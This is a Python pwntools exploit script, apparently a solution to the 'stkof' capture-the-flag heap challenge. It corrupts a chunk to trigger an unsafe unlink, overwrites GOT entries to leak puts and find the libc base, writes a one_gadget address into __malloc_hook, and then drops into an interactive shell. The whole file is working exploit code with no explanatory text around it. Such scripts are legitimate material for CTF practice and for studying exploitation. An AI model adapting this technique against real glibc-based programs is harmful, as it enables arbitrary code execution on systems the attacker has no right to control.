from pwn import *

context.log_level = 'debug'

r = process('./stkof')
elf = ELF('./stkof')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

#system_plt = elf.plt['system']
#print 'system_plt= ' + hex(system_plt)
free_got = elf.got['free']
print 'free_got= ' + hex(free_got)
puts_plt = elf.plt['puts']
print 'puts_plt= ' + hex(puts_plt)
puts_got = elf.got['puts']
print 'puts_got= ' + hex(puts_got)
got0= elf.get_section_by_name('.got.plt').header.sh_addr
print 'got0= ' + hex(got0)
fake_chunk = got0 + 2 - 8
print 'fake_chunk= ' + hex(fake_chunk)
chunklist=0x602140

def add(size, wait=True):
  r.sendline('1')
  r.sendline(str(size))
  if (wait):
    r.recvuntil('\n')
    r.recvuntil('\n')

def free(index):
  r.sendline('3')
  r.sendline(str(index))
  data = r.recvuntil('\n', drop = True)
  return data

def edit(index, content):
  r.sendline('2')
  r.sendline(str(index))
  r.sendline(str(len(content)))
  r.send(content)
  r.recvuntil('\n')

def exp():

  add(0x80)  # 1
  add(0x80)  # 2
  add(0x80)  # 3 <-
  add(0x80)  # 4

  payload = p64(0) + p64(0x81) + p64(chunklist + 0x18 - 0x18) + p64(chunklist + 0x18 - 0x10)
  payload = payload.ljust(0x80, '\0')
  payload += p64(0x80) + p64(0x90) #overwrite 4
  edit(3, payload)
  free(4) # cause unlink 3
  
  payload = p64(free_got) + p64(puts_got)
  edit(3, payload) # chunklist[0] = free_got, chunklist[1] = puts_got
  
  edit(0, p64(puts_plt))
  data = free(1)
  puts_addr = u64(data + '\0' * 2)
  print 'puts_addr= ' + hex(puts_addr)
  
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  libc_base = puts_addr - libc.symbols['puts']
  malloc_hook = libc_base + libc.symbols['__malloc_hook']
  print 'malloc_hook= ' + hex(malloc_hook)
  one_gadget = libc_base + 0xf1147 #0xf02a4 also works
  print 'one_gadget= ' + hex(one_gadget)
#  system_addr = libc_base + libc.symbols['system']
#  print 'system_addr= ' + hex(system_addr)
  
  edit(3, p64(malloc_hook))
  edit(0, p64(one_gadget))
#  gdb.attach(r)
  add(0x100, wait=False)

#  edit(2, '/bin/sh')
#  free(2)  
  r.interactive()


if __name__ == '__main__':
  exp()
